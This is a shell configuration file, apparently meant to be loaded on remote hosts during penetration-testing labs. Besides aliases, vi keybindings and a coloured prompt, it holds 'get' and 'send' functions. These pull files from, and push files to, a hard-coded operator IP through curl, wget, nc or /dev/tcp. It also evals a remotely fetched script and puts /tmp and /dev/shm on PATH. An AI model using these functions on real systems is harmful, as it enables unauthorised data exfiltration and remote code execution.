#!/bin/sh
  if command -v bash >/dev/null 2>&1; then
    export HISTCONTROL="ignoreboth"
  fi


  #---------------------------------------------------------------------------------------------------
  #                                             ALIASES
  #---------------------------------------------------------------------------------------------------
  alias la='ls -alh --color=always'
  alias lad='ls -lhatr --color=always'
  alias lar='ls -lhatR --color=always'
  alias grep='grep --color=always'
  alias pgrep='pgrep -iaf'
  alias chmod='chmod -v'
  alias chown='chown -v'
  alias chgrp='chgrp -v'
  alias cp='cp -v'
  alias mv='mv -v'
  alias rm='rm -v'
  alias mkdir='mkdir -pv'
  alias ln='ln -v'
  alias killall='killall -I -v'
  alias locate='locate -i'
  alias wrap='setterm -linewrap on'
  alias nowrap='setterm -linewrap off'

  alias b='cd ..'
  alias bb='cd ../..'
  alias 3b='cd ../../..'
  alias 4b='cd ../../../..'
  alias 5b='cd ../../../../..'

  #---------------------------------------------------------------------------------------------------
  #                                             FUNCTIONS
  #---------------------------------------------------------------------------------------------------
  export HTTP_SERVER_PORT=80
  export FILE_TRANSFER_PORT=9898

  #TODO: add completion for the files in the server dir
  get() {
    __cwd="$(hostname)":"$(pwd)/$1"

    if command -v wget >/dev/null 2>&1; then
      wget --no-check-certificate --header="X-CWD: $__cwd" -qO - "$MYIP:$HTTP_SERVER_PORT/$1" && return

    elif command -v curl >/dev/null 2>&1; then
      curl -sk -H "X-CWD: $__cwd" "$MYIP:$HTTP_SERVER_PORT/$1" && return

    elif command -v nc >/dev/null 2>&1; then
      printf "GET /%s HTTP/1.1\r\nHost: %s:%s\r\nX-CWD: %s\r\nConnection: close\r\n\r\n" "$1" "$MYIP" "$HTTP_SERVER_PORT" "$__cwd" \
        | nc -nv "$MYIP" "$HTTP_SERVER_PORT" \
        | awk 'BEGIN{RS="";FS="\r\n"}{print $NF}' \
        && return

    elif [ "$SHELL" = "/bin/bash" ]; then
      # shellcheck disable=SC3025,SC3043,SC3003,SC3045,SC2034
      {
      exec 3<> /dev/tcp/"$MYIP"/"$HTTP_SERVER_PORT" || {
        echo "Failed to connect to $MYIP:$HTTP_SERVER_PORT" >&2
        return 1
      }

      printf "GET /%s HTTP/1.1\r\nHost: %s:%s\r\nX-CWD: %s\r\nConnection: close\r\n\r\n" "$1" "$MYIP" "$HTTP_SERVER_PORT" "$__cwd" >&3

      local line=""
      while true; do
        IFS= read -r -d $'\r' line <&3
        read -r -d $'\n' dummy <&3
        [ -z "$line" ] && break
      done

      cat <&3
      exec 3>&-
      }
    else
      echo "Error: no download method available" >&2
      return 1
    fi
  }

  send() {
    __resource="$1"
    if command -v curl >/dev/null 2>&1; then
      curl -F file=@"$__resource" $MYIP/upload
    elif [ "$SHELL" = "/bin/bash" ]; then
      # shellcheck disable=SC3025
      cat "$__resource" > /dev/tcp/"$MYIP"/"$FILE_TRANSFER_PORT" && return
    elif command -v nc >/dev/null 2>&1; then
      nc -nv "$MYIP" "$FILE_TRANSFER_PORT" < "$__resource" && return
    else
      echo "Error: Unable to send file." >&2
    fi
  }

  #---------------------------------------------------------------------------------------------------
  #                                         ENV and SETTINGS
  #---------------------------------------------------------------------------------------------------
  stty rows 36 cols 142

  export PATH="/tmp:/dev/shm:${PATH}"
  export TERM=xterm-256color
  export MYIP="10.10.15.82"
  export LESSHISTFILE="/dev/null"
  export LESS="-igR -j.5"
  export SHELL=/bin/sh
  export EDITOR="vi"
  export VISUAL="vi"

  if command -v vim >/dev/null 2>&1; then
    export EDITOR="vim"
    export VISUAL="vim"
  fi

  if ! command -v bash >/dev/null 2>&1; then
    return
  fi

  # shellcheck disable=SC3044,SC3011,SC3046,SC3001,SC1090,SC1091,SC3051
  {
  export SHELL=/bin/bash

  shopt -s globstar # Enable recursive globbing
  shopt -s autocd   # Automatically change to directory
  shopt -s cdable_vars # Allow cd to variable names
  shopt -s cmdhist  # Allow multiline commands to be stored as single entries in history
  shopt -s no_empty_cmd_completion # Prevent completion on an empty line

  if [ -f "/etc/bash_completion" ]; then
    source /etc/bash_completion
  elif [ -f "/usr/share/bash-completion/bash_completion" ]; then
    source /usr/share/bash-completion/bash_completion
  else
    __bash_completion="$(timeout 2 bash -c "$(declare -f get); get bash_completion" 2>/dev/null)"
    __exit_code=$?
    if [ "$__exit_code" -eq 124 ]; then
      echo "Timeout trying to source bash_completion" >&2
    elif [ $__exit_code -eq 0 ] && [ -n "$__bash_completion" ]; then
      # source <(echo "$__bash_completion")
      eval "$__bash_completion"
    fi

    unset __bash_completion __exit_code
    export -fn get
  fi

  read -r -d '' INPUTRC << 'EOF'
set show-all-if-ambiguous on
set completion-ignore-case on
set mark-symlinked-directories on
set visible-stats on
set skip-completed-text on
set colored-stats On
set colored-completion-prefix On
set menu-complete-display-prefix On
set visible-stats On
set mark-symlinked-directories On
set bind-tty-special-chars off
set editing-mode vi
set keyseq-timeout 250
set show-mode-in-prompt on
$if mode=vi
set keymap vi-command
"\e.":  yank-last-arg
"/":    "cc\C-r"
"|":    "A | "
">":    "A > "
">>":   "A >> "
"H":    beginning-of-line
"L":    end-of-line
"C":    "Da"
"dw":   kill-word
"dd":   kill-whole-line
"db":   backward-kill-word
"cc":   "ddi"
"cw":   "dwi"
"cb":   "dbi"
"daw":  "lbdW"
"yaw":  "lbyW"
"caw":  "lbcW"
"diw":  "lbdw"
"yiw":  "lbyw"
"ciw":  "lbcw"
"da\"": "lF\"df\""
"di\"": "lF\"lmtf\"d`t"
"ci\"": "di\"i"
"ca\"": "da\"i"
"da'":  "lF'df'"
"di'":  "lF'lmtf'd`t"
"ci'":  "di'i"
"ca'":  "da'i"
"da\`":  "lF\`df\`"
"di\`":  "lF\`lmtf\`d\`t"
"ci\`":  "di\`i"
"ca\`":  "da\`i"
"da(":  "lF(df)"
"di(":  "lF(lmtf)d`t"
"ci(":  "di(i"
"ca(":  "da(i"
"da)":  "lF(df)"
"di)":  "lF(lmtf)d`t"
"ci)":  "di(i"
"ca)":  "da(i"
"da{":  "lF{df}"
"di{":  "lF{lmtf}d`t"
"ci{":  "di{i"
"ca{":  "da{i"
"da}":  "lF{df}"
"di}":  "lF{lmtf}d`t"
"ci}":  "di}i"
"ca}":  "da}i"
"da[":  "lF[df]"
"di[":  "lF[lmtf]d`t"
"ci[":  "di[i"
"ca[":  "da[i"
"da]":  "lF[df]"
"di]":  "lF[lmtf]d`t"
"ci]":  "di]i"
"ca]":  "da]i"
"da<":  "lF<df>"
"di<":  "lF<lmtf>d`t"
"ci<":  "di<i"
"ca<":  "da<i"
"da>":  "lF<df>"
"di>":  "lF<lmtf>d`t"
"ci>":  "di>i"
"ca>":  "da>i"
"da/":  "lF/df/"
"di/":  "lF/lmtf/d`t"
"ci/":  "di/i"
"ca/":  "da/i"
"da:":  "lF:df:"
"di:":  "lF:lmtf:d`t"
"ci:":  "di:i"
"ca:":  "da:i"

set keymap vi-insert
"\e.":  yank-last-arg
"\C-s": "$()\e[D"
"\C-g": "| grep ""\e[D"

$endif
EOF
  while IFS= read -r line; do bind "$line" 2>/dev/null;done <<< "$INPUTRC"

  __green() {
    printf "\1\e[32;1m\2%s\1\e[0m\2" "$1"
  }

  __yellow() {
    printf "\1\e[33;1m\2%s\1\e[0m\2" "$1"
  }

  __blue() {
    printf "\1\e[34;1m\2%s\1\e[0m\2" "$1"
  }

  __prompt_string_git_branch() {
    command -v git >/dev/null 2>&1 || return
    local current_branch=$(git symbolic-ref HEAD --short 2>/dev/null)
    [ -z "$current_branch" ] && return || echo "$current_branch  "
  }

  __prompt_command() {
    history -a 2>/dev/null

    local o_bracket=$(__yellow "[")
    local user=$(__green "$(id -un)")
    local at=$(__yellow "@")
    local host=$(__green "$HOSTNAME")
    local colon=$(__yellow "::")
    local pwd=$(__green "$(pwd)")
    local c_bracket=$(__yellow "]")
    local branch=$(__yellow "$(__prompt_string_git_branch)")

    echo -e "${o_bracket}${user}${at}${host}${colon}${pwd}${c_bracket} ${branch}"
  }

  bind "set vi-cmd-mode-string $(__green "::")"
  bind "set vi-ins-mode-string $(__blue ">>")"

  PROMPT_COMMAND="__prompt_command"
  PS1=" "
  PS2="   "
  }
